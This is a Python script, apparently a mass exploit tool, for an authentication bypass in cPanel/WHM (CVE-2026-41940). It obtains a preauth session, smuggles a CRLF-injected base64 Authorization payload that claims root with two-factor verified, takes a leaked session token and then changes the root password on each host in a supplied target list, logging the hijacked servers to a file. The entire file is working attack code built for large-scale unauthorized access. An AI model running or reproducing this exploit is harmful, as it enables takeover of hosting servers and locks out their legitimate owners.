import argparse
import base64
import json
import re
import sys
import urllib.parse
import requests
import urllib3
from datetime import datetime
from requests.exceptions import Timeout, ConnectionError

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

BANNER = """                    CVE-2026-41940 bypass authentication - MASS MODE
"""
print(BANNER)

PAYLOAD_B64 = (
    "cm9vdDp4DQpzdWNjZXNzZnVsX2ludGVybmFsX2F1dGhfd2l0aF90aW1lc3RhbXA9OTk5"
    "OTk5OTk5OQ0KdXNlcj1yb290DQp0ZmFfdmVyaWZpZWQ9MQ0KaGFzcm9vdD0x"
)

# File log untuk hasil sukses
SUCCESS_LOG = "success.txt"

def log_success(target_url, password, message=""):
    """Catat target yang berhasil ke file success.txt"""
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    with open(SUCCESS_LOG, "a") as f:
        f.write(f"[{timestamp}] {target_url} | password: {password} | {message}\n")
    print(f"  [LOG] Success recorded to {SUCCESS_LOG}")

def parse_target(url):
    url = url.strip()
    if not url:
        return None, None, None
    if "://" not in url:
        url = "https://" + url
    u = urllib.parse.urlsplit(url.rstrip("/"))
    scheme = u.scheme if u.scheme else "https"
    hostname = u.hostname
    if not hostname:
        return None, None, None
    port = u.port or 2087
    return scheme, hostname, port

def discover_canonical_host(scheme, host, port):
    if not scheme or not host:
        return host
    try:
        r = requests.get(
            f"{scheme}://{host}:{port}/openid_connect/cpanelid",
            verify=False,
            allow_redirects=False,
            headers={"Connection": "close"},
            timeout=10,
        )
    except Exception:
        return host
    loc = r.headers.get("Location", "")
    m = re.match(r"^https?://([^:/]+)", loc)
    if m:
        return m.group(1)
    return host

def make_session():
    s = requests.Session()
    s.verify = False
    return s

def http(s, method, scheme, host, port, canonical, path, **kw):
    headers = kw.pop("headers", {})
    headers.setdefault("Host", f"{canonical}:{port}")
    headers.setdefault("Connection", "close")
    return s.request(
        method,
        f"{scheme}://{host}:{port}{path}",
        headers=headers,
        allow_redirects=False,
        timeout=15,
        **kw,
    )

def stage1_preauth(s, scheme, host, port, canonical):
    print("  [1] minting preauth session...")
    try:
        r = http(s, "POST", scheme, host, port, canonical,
                 "/login/?login_only=1",
                 data={"user": "root", "pass": "wrong"})
    except Exception as e:
        print(f"  [!] error: {e}")
        return None

    cookie_value = None
    for k, v in r.raw.headers.items():
        if k.lower() == "set-cookie" and v.startswith("whostmgrsession="):
            cookie_value = v.split("=", 1)[1].split(";", 1)[0]
            cookie_value = urllib.parse.unquote(cookie_value)
            break

    if not cookie_value:
        print("  [!] no whostmgrsession cookie")
        return None

    if "," in cookie_value:
        session_base = cookie_value.split(",", 1)[0]
    else:
        session_base = cookie_value

    print(f"     session base: {session_base}")
    return session_base

def stage2_inject(s, scheme, host, port, canonical, session_base):
    print("  [2] CRLF injection...")
    cookie_enc = urllib.parse.quote(session_base)
    try:
        r = http(s, "GET", scheme, host, port, canonical, "/",
                 headers={
                     "Authorization": f"Basic {PAYLOAD_B64}",
                     "Cookie": f"whostmgrsession={cookie_enc}",
                 })
    except Exception as e:
        print(f"  [!] error: {e}")
        return None

    loc = r.headers.get("Location", "")
    m = re.search(r"/cpsess\d{10}", loc)
    if not m:
        print(f"  [!] no token leaked (HTTP {r.status_code})")
        return None
    token = m.group(0)
    print(f"     HTTP {r.status_code}, token: {token}")
    return token

def stage3_propagate(s, scheme, host, port, canonical, session_base):
    print("  [3] propagating to cache...")
    cookie_enc = urllib.parse.quote(session_base)
    try:
        r = http(s, "GET", scheme, host, port, canonical, "/scripts2/listaccts",
                 headers={"Cookie": f"whostmgrsession={cookie_enc}"})
    except Exception as e:
        print(f"  [!] error: {e}")
        return False

    body = r.text or ""
    if r.status_code == 401 and ("Token denied" in body or "WHM Login" in body):
        print(f"     HTTP {r.status_code}, gadget fired")
        return True
    else:
        print(f"  [!] propagation failed (HTTP {r.status_code})")
        return False

def stage4_verify(s, scheme, host, port, canonical, session_base, token):
    print("  [4] verifying WHM root access...")
    cookie_enc = urllib.parse.quote(session_base)
    try:
        r = http(s, "GET", scheme, host, port, canonical,
                 f"{token}/json-api/version",
                 headers={"Cookie": f"whostmgrsession={cookie_enc}"})
    except Exception as e:
        print(f"  [!] error: {e}")
        return False

    body = (r.text or "").strip()
    print(f"     /version -> HTTP {r.status_code} {body[:100]}")
    if r.status_code == 200 and '"version"' in body:
        return True
    if r.status_code in (500, 503) and "License" in body:
        return True
    return False

def do_passwd(s, scheme, host, port, canonical, session_base, token, password):
    print(f"  [*] changing root password to: {password}")
    cookie_enc = urllib.parse.quote(session_base)
    qs = f"api.version=1&user=root&password={urllib.parse.quote(password)}"
    path = f"{token}/json-api/passwd?{qs}"
    try:
        r = http(s, "GET", scheme, host, port, canonical, path,
                 headers={"Cookie": f"whostmgrsession={cookie_enc}"})
        print(f"     passwd -> HTTP {r.status_code}")
        try:
            j = json.loads(r.text)
            print(json.dumps(j, indent=2)[:500])
            if j.get('metadata', {}).get('result') == 1:
                return True, j
            else:
                reason = j.get('metadata', {}).get('reason', 'Unknown reason')
                print(f"  [!] Password change failed: {reason}")
                return False, j
        except:
            print(r.text[:500])
            return False, None
    except Exception as e:
        print(f"  [!] error: {e}")
        return False, None

def exploit_target(target_url, password, hostname_override=None):
    print(f"\n>>> Exploiting: {target_url}")
    scheme, host, port = parse_target(target_url)
    if not host:
        print("  [-] Invalid target format, skipping")
        return False

    canonical = hostname_override or discover_canonical_host(scheme, host, port)
    if canonical is None:
        canonical = host
    print(f"    canonical host: {canonical}")

    s = make_session()

    session_base = stage1_preauth(s, scheme, host, port, canonical)
    if not session_base:
        print("  [-] Preauth failed")
        return False

    token = stage2_inject(s, scheme, host, port, canonical, session_base)
    if not token:
        print("  [-] Injection failed")
        return False

    if not stage3_propagate(s, scheme, host, port, canonical, session_base):
        print("  [-] Propagation failed")
        return False

    if not stage4_verify(s, scheme, host, port, canonical, session_base, token):
        print("  [-] Verification failed - target might be patched")
        return False

    success, result = do_passwd(s, scheme, host, port, canonical, session_base, token, password)
    if success:
        print(f"  [+] SUCCESS for {target_url} - password changed to {password}")
        log_success(target_url, password, "Password changed successfully")
    else:
        print(f"  [-] Password change failed for {target_url}")
        if result and 'metadata' in result:
            log_success(target_url, password, f"FAILED: {result['metadata'].get('reason', 'unknown')}")
    return success

def main():
    parser = argparse.ArgumentParser(description="Mass exploit CVE-2026-41940")
    parser.add_argument("--list", required=True, help="File containing list of targets")
    parser.add_argument("--password", required=True, help="New root password")
    parser.add_argument("--hostname", default=None, help="Override Host header")
    args = parser.parse_args()

    try:
        with open(args.list, "r") as f:
            targets = [line.strip() for line in f if line.strip()]
    except Exception as e:
        print(f"[!] Cannot read file {args.list}: {e}")
        sys.exit(1)

    # Clear previous success log (optional, comment out if want to append)
    # with open(SUCCESS_LOG, "w") as f:
    #     f.write(f"# CVE-2026-41940 Exploit Results - {datetime.now()}\n")

    print(f"[*] Loaded {len(targets)} targets from {args.list}")
    print(f"[*] Success log will be saved to: {SUCCESS_LOG}")
    success_count = 0
    for idx, target in enumerate(targets, 1):
        print(f"\n========== Target {idx}/{len(targets)} ==========")
        if exploit_target(target, args.password, args.hostname):
            success_count += 1
        else:
            print(f"  [-] Failed for {target}")

    print(f"\n[+] Done. Successful: {success_count} / {len(targets)}")
    print(f"[+] Check {SUCCESS_LOG} for detailed list of successful targets.")

if __name__ == "__main__":
    main()